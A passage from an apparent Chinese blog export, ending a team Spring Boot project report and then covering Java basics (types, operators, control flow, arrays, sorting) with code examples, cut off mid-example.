系统演示</h2></li><li><p>操作视频：</p></li><li><p>主要功能截图：</p></li><li><h2 id="6-团队成员负责模块">6. 团队成员负责模块</h2></li><li></li><li><table><thead><tr><th>成员姓名</th><th>负责模块</th><th>主要贡献</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>周永康</th><th>数据库，安全模块，github管理模块 blog管理</th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>张淏鸣          前端，用户管理，编码crypot模块</th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>姚昭丞           帖子post模块，帖子管理模块，内容支持模块，创意模块</th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table></li><li><h2 id="7-项目-Git-地址">7. 项目 Git 地址</h2></li><li><p>Git 仓库地址：<a href="https://github.com/mengnankkkk/worktest">https://github.com/mengnankkkk/worktest</a></p></li><li><p>仓库说明：用来存储源代码</p></li><li><h2 id="8-团队成员-Git-提交记录截图">8. 团队成员 Git 提交记录截图</h2></li><li><p>截图展示：每个成员的 Git 提交记录截图</p></li><li><h2 id="9-项目总结">9. 项目总结</h2></li><li><p>完成情况和成果：项目按计划完成，实现了预定的所有功能，并通过了系统测试。项目展示了团队成员在 Spring Boot 开发、前后端交互和数据库设计方面的能力。用户反馈良好，系统性能稳定，用户体验友好。</p></li><li><p>后续计划：未来我们计划继续优化系统性能，增加更多互动功能，如即时聊天、私信等。同时，将考虑引入人工智能技术，实现智能推荐和数据分析功能。</p></li><li><p>致谢：感谢所有团队成员的辛勤付出。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> work </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习基础（1）</title>
      <link href="/2024/04/23/java1/"/>
      <url>/2024/04/23/java1/</url>
      
        <content type="html"><![CDATA[<h1>java basic</h1><h2 id="1-面对对象">1.面对对象</h2><p>1.类和对象</p><p>属性，即可以设置的一些属性</p><p>方法即可以进行的一些行为</p><h2 id="2-变量">2.变量</h2><p>java中有八种基本类型，这八种都是关键字，在设置变量时不能够用这些关键字。</p><p>这八种分别是：</p><p>整型 （4种）<br>字符型 （1种）<br>浮点型 （2种）<br>布尔型（1种）</p><h3 id="1-整型">1.整型</h3><table><thead><tr><th>类型</th><th>缺省值</th><th>长度</th><th>范围</th></tr></thead><tbody><tr><td>byte</td><td>0</td><td>8</td><td>-128~127</td></tr><tr><td>short</td><td>0</td><td>16</td><td>-32768~32767</td></tr><tr><td>int</td><td>0</td><td>32</td><td>-2147483648~2147483647</td></tr><tr><td>long</td><td>0</td><td>64</td><td>-9223372036854~9223372036854</td></tr></tbody></table><h3 id="2-字符型">2.字符型</h3><p>char 类型用于存放一个字符，值用单引号表示（双引号表示字符串）</p><h3 id="3-浮点型">3.浮点型</h3><p><strong>注意： 默认的小数值是double类型的</strong><br>所以 float f = 54.321会出现编译错误，因为54.321的默认类型是 double，其类型 长度为64，超过了float的长度32<br>在数字后面<strong>加一个字母f</strong>，直接把该数字声明成float类型<br>float f2 = 54.321<strong>f</strong>,</p><h3 id="4-布尔型">4.布尔型</h3><p>布尔型表示真假，其长度为1</p><p>true false</p><h3 id="5-Sting">5.Sting</h3><h3 id="字面型：">字面型：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line"><span class="type">char</span> a= <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是转义字符</span></span><br><span class="line"><span class="type">char</span> <span class="variable">tab</span> <span class="operator">=</span> <span class="string">&#x27;\t&#x27;</span>; <span class="comment">//制表符</span></span><br><span class="line"><span class="type">char</span> <span class="variable">carriageReturn</span> <span class="operator">=</span> <span class="string">&#x27;\r&#x27;</span>; <span class="comment">//回车</span></span><br><span class="line"><span class="type">char</span> <span class="variable">newLine</span> <span class="operator">=</span> <span class="string">&#x27;\n&#x27;</span>; <span class="comment">//换行</span></span><br><span class="line"><span class="type">char</span> <span class="variable">doubleQuote</span> <span class="operator">=</span> <span class="string">&#x27;\&quot;&#x27;</span>; <span class="comment">//双引号</span></span><br><span class="line"><span class="type">char</span> <span class="variable">singleQuote</span> <span class="operator">=</span> <span class="string">&#x27;\&#x27;&#x27;</span>; <span class="comment">//单引号</span></span><br><span class="line"><span class="type">char</span> <span class="variable">backslash</span> <span class="operator">=</span> <span class="string">&#x27;\\&#x27;</span>; <span class="comment">//反斜杠</span></span><br></pre></td></tr></table></figure><h3 id="类型转换">类型转换</h3><p>规则：从小到大自动转，从大到小强制转</p><h3 id="作用域">作用域</h3><p>如果一个变量，是声明在一个方法上的，就叫做<strong>参数</strong><br>参数的作用域即为该方法内的所有代码<br>其他方法不能访问该参数<br>类里面也不能访问该参数</p><p>声明在方法内的变量，叫做局部变量<br>其作用域在声明开始的位置，到其所处于的块结束位置</p><h3 id="final">final</h3><p>准确的描述是 当一个变量被final修饰的时候，该变量<strong>只有一次赋值的机会</strong></p><h2 id="3-操作符">3.操作符</h2><p>scanner操作符（向控制台输入数据）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">float</span> <span class="variable">a</span> <span class="operator">=</span> s.nextFloat();</span><br><span class="line">        System.out.println(<span class="string">&quot;读取的浮点数的值是：&quot;</span>+a);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br></pre></td></tr></table></figure><p>要先引用。</p><p>字符串时LIne</p><p>注意：需要注意的是，如果在通过nextInt()读取了整数后，再接着读取字符串，读出来的是回车换行:“\r\n”,因为nextInt仅仅读取数字信息，而不会<strong>读取</strong>回车换行&quot;\r\n&quot;.</p><p>所以，如果在业务上需要读取了整数后，接着读取字符串，那么就应该连续执行两次nextLine()，第一次是取走回车换行，第二次才是读取真正的字符串import java.util.Scanner;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;读取的整数是&quot;</span>+ i);</span><br><span class="line">        <span class="type">String</span> <span class="variable">rn</span> <span class="operator">=</span> s.nextLine();</span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> s.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;读取的字符串是：&quot;</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="算数">算数</h4><p>如果任何运算单元的长度都不超过int,那么运算结果就按照int来计算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span> b= <span class="number">2</span>;</span><br><span class="line"><span class="type">byte</span> <span class="variable">c</span> <span class="operator">=</span> (<span class="type">byte</span>) (a+b); <span class="comment">//虽然a b都是byte类型，但是运算结果是int类型，需要进行强制转换</span></span><br><span class="line"><span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逻辑运算符">逻辑运算符</h3><p>&amp;&amp;与&amp;</p><p>无论长路与还是短路与<br>两边的运算单元都是布尔值<br>都为真时，才为真<br>任意为假，就为假<br>区别<br>长路与 两侧，都会被运算<br>短路与 只要第一个是false，第二个就不进行运算了</p><p>||与|</p><p>无论长路或还是短路或<br>两边的运算单元都是布尔值<br>都为假时，才为假<br>任意为真，就为真<br>区别<br>长路或 两侧都会被运算<br>短路或 只要第一个是true的，第二个就不进行运算了</p><p>！</p><p>取反!<br>真变为假<br>假变为真</p><p>^</p><p>异或^<br>不同，返回真<br>相同，返回假</p><h3 id="位操作符">位操作符</h3><table><thead><tr><th>Integer.toBinaryString()</th><th>一个整数的二进制表达</th><th><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step1066">示例代码</a></th></tr></thead><tbody><tr><td>|</td><td>位或</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step541">示例代码</a></td></tr><tr><td>&amp;</td><td>位与</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step542">示例代码</a></td></tr><tr><td>^</td><td>异或</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step543">示例代码</a></td></tr><tr><td>~</td><td>取非</td><td><a href="https://how2j.cn/k/operator/operator-bitwise/270.html#step544">示例代码</a></td></tr><tr><td>&lt;&lt; &gt;&gt;</td><td>左移 右移</td><td></td></tr></tbody></table><h4 id="位或">位或</h4><p>5的二进制是101<br>6的二进制是110<br>所以 5|6 对每一位进行或运算，得到 111-&gt;7</p><h4 id="位与">位与</h4><p>5的二进制是101<br>6的二进制是110<br>所以 5&amp;6 对每一位进行与运算，得到 100-&gt;4</p><h4 id="异或">异或</h4><p>5的二进制是101<br>6的二进制是110<br>所以 5^6 对每一位进行异或运算，得到 011-&gt;3</p><p>一些特别情况：<br>任何数和自己进行异或 都等于 0<br>任何数和0 进行异或 都等于自己</p><h4 id="取非">取非</h4><p>5 的二进制是 00000101<br>所以取反即为 11111010<br>这个二进制换算成十进制即为-6</p><h4 id="左移右移">左移右移</h4><p>左移：根据一个整数的二进制表达，将其每一位都向左移动，最右边一位补0<br>右移：根据一个整数的二进制表达，将其每一位都向右移动</p><h3 id="java三元操作符">java三元操作符</h3><p>表达式?值1:值2<br>如果表达式为真 返回值1<br>如果表达式为假 返回值2</p><h2 id="4-java控制流程">4.java控制流程</h2><h3 id="if语句">if语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(表达式<span class="number">1</span>)&#123;</span><br><span class="line">  表达式<span class="number">2</span>；</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">//如果有多个表达式，必须用大括弧包括起来</span></span><br><span class="line"><span class="comment">//如果只有一个表达式可以不用写括弧，看上去会简约一些</span></span><br></pre></td></tr></table></figure><h3 id="if-else语句">if else语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (b)</span><br><span class="line">System.out.println(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">System.out.println(<span class="string">&quot;no&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="else-if-是多条件判断">else if 是多条件判断</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果只使用 if,会执行4次判断</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">1</span>)</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">2</span>)</span><br><span class="line">System.out.println(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">3</span>)</span><br><span class="line">System.out.println(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">4</span>)</span><br><span class="line">System.out.println(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果使用else if, 一旦在18行，判断成立， 20行和22行的判断就不会执行了，节约了运算资源</span></span><br><span class="line"><span class="keyword">if</span> (i==<span class="number">1</span>)</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">2</span>)</span><br><span class="line">System.out.println(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">3</span>)</span><br><span class="line">System.out.println(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">4</span>)</span><br><span class="line">System.out.println(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="swich语句">swich语句</h3><p>switch可以使用byte,short,int,char,String,enum</p><p><strong>注:</strong> 每个表达式结束，都应该有一个break;<br><strong>注:</strong> String在Java1.7之前是不支持的, Java从1.7开始支持switch用String的，编译后是把String转化为hash值，其实还是整数</p><h3 id="while和do-while循环">while和do while循环</h3><table><thead><tr><th>while</th><th>条件为true时 重复执行</th><th><a href="https://how2j.cn/k/control-flow/control-flow-while/273.html#step560">示例代码</a></th></tr></thead><tbody><tr><td>do while</td><td>条件为true时 重复执行，至少会执行一次</td><td></td></tr></tbody></table><h3 id="for循环">for循环</h3><p>和c语言一样 for</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br></pre></td></tr></table></figure><h3 id="continue">continue</h3><p>继续进行下一次循环</p><h3 id="结束循环">结束循环</h3><h4 id="结束当前循环：break">结束当前循环：break</h4><h4 id="使用boolean变量结束外部循环">使用boolean变量结束外部循环</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">breakout</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//是否终止外部循环的标记</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                System.out.println(i + <span class="string">&quot;:&quot;</span> + j);</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> == j % <span class="number">2</span>) &#123;</span><br><span class="line">                    breakout = <span class="literal">true</span>; <span class="comment">//终止外部循环的标记设置为true</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (breakout) <span class="comment">//判断是否终止外部循环</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用标签结束外部循环">使用标签结束外部循环</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//打印单数    </span></span><br><span class="line">        outloop: <span class="comment">//outloop这个标示是可以自定义的比如outloop1,ol2,out5</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                System.out.println(i+<span class="string">&quot;:&quot;</span>+j);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span>==j%<span class="number">2</span>) </span><br><span class="line">                    <span class="keyword">break</span> outloop; <span class="comment">//如果是双数，结束外部循环</span></span><br><span class="line">            &#125;</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-数组">5.数组</h2><h3 id="声明数组-创建数组">声明数组-创建数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//声明一个引用</span></span><br><span class="line"><span class="type">int</span>[] a; </span><br><span class="line"><span class="comment">//创建一个长度是5的数组，并且使用引用a指向该数组</span></span><br><span class="line">a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] b = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>]; <span class="comment">//声明的同时，指向一个数组</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数组的第一个数是从0开始的，<strong>.length属性</strong>用于访问一个数组的长度<br>数组访问下标范围是0到长度-1<br>一旦超过这个范围,就会产生数组下标越界异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] a; </span><br><span class="line">a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">System.out.println(a.length); <span class="comment">//打印数组的长度</span></span><br><span class="line"></span><br><span class="line">a[<span class="number">4</span>]=<span class="number">100</span>; <span class="comment">//下标4，实质上是“第5个”，即最后一个 </span></span><br><span class="line">a[<span class="number">5</span>]=<span class="number">101</span>; <span class="comment">//下标5，实质上是“第6个”，超出范围 ,产生数组下标越界异常</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随机获得整数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(int) (Math.random() * 100)</span><br></pre></td></tr></table></figure><h3 id="初始化数组">初始化数组</h3><p>作为int类型的数组，默认值是0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//写法一： 分配空间同时赋值</span></span><br><span class="line">        <span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">100</span>,<span class="number">102</span>,<span class="number">444</span>,<span class="number">836</span>,<span class="number">3236</span>&#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//写法二： 省略了new int[],效果一样</span></span><br><span class="line">        <span class="type">int</span>[] b = &#123;<span class="number">100</span>,<span class="number">102</span>,<span class="number">444</span>,<span class="number">836</span>,<span class="number">3236</span>&#125;;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//写法三：同时分配空间，和指定内容</span></span><br><span class="line">        <span class="comment">//在这个例子里，长度是3，内容是5个，产生矛盾了</span></span><br><span class="line">        <span class="comment">//所以如果指定了数组的内容，就不能同时设置数组的长度</span></span><br><span class="line">        <span class="type">int</span>[] c = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>]&#123;<span class="number">100</span>,<span class="number">102</span>,<span class="number">444</span>,<span class="number">836</span>,<span class="number">3236</span>&#125;;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序">排序</h3><h4 id="选择排序">选择排序</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a [] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">18</span>,<span class="number">62</span>,<span class="number">68</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="comment">//排序前，先把内容打印出来</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            System.out.print(a[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="comment">//选择法排序</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">//第一步： 把第一位和其他所有位进行比较</span></span><br><span class="line">        <span class="comment">//如果发现其他位置的数据比第一位小，就进行交换</span></span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;a[<span class="number">0</span>])&#123;  </span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> a[<span class="number">0</span>];</span><br><span class="line">                a[<span class="number">0</span>] = 